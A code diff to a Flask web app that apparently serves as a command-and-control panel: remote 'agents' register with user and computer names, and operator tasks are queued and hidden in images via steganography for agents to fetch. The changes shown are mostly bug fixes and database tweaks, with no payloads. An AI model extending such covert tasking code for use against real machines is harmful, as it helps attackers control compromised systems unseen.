@@ -56,7 +56,7 @@ def main():
 class Commands(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
-    cmd = db.Column(db.String(4096))
+    cmds = db.Column(db.String(4096))
     done = db.Column(db.Boolean)
 
 
@@ -81,6 +81,9 @@ class Agents(db.Model):
     guid = db.Column(db.String(64), primary_key=True)
     user = db.Column(db.String(256))
     computer = db.Column(db.String(256))
+
+# db.create_all()
+
 
 
 def getUserList():
@@ -126,7 +129,7 @@ def request_loader(request):
 def home():
     get_commands = Commands.query.all()
     if len(Results.query.all()) == 0:
-        return render_template('index.html', returns=' \n ', name=flask_login.current_user.id)
+        return render_template('index.html', returns=' \n ', commands=get_commands, name=flask_login.current_user.id)
     else:
         get_returns = Results.query.order_by(desc(Results.id))
         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
@@ -152,13 +155,11 @@ def register():
             save_agent = Agents(guid=guid, user=user, computer=computer)
             db.session.add(save_agent)
             db.session.commit()
+            print("Agent saved to the db")
         return render_template('register.html')
     else:
         return render_template('redir.html')
 
-
-# TODO CHANGE COMMANDS FUNCTION TO WORK WITH STEGANOGRAPHY
-# NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO
 
 
 @app.route("/get-image/<image_name>", methods=['GET', 'POST'])
@@ -234,9 +235,9 @@ def create():
     if request.form['task_3'] != None:
         cmd3 = request.form['task_3']
 
-    new_cmds = Commands(command=cmd + cmd2 + cmd3, done=True)
+    new_cmds = Commands(cmds=cmd +" "+ cmd2 +" "+ cmd3, done=False)
     db.session.add(new_cmds)
-    db.commit()
+    db.session.commit()
 
     cmds = [cmd, cmd2, cmd3]
     pic_num = random.randint(1, 5)
@@ -246,9 +247,7 @@ def create():
     print("Encoded Image Num: ", enc_image_num)
     encodeImage(cmds, img, enc_image_num)
     enc_image_num += 1
-    # new_task = Command(cmd=request.form['content'], done=False)
-    # db.session.add(new_task)
-    # db.session.commit()
+
     return redirect(url_for('home'))
 
 
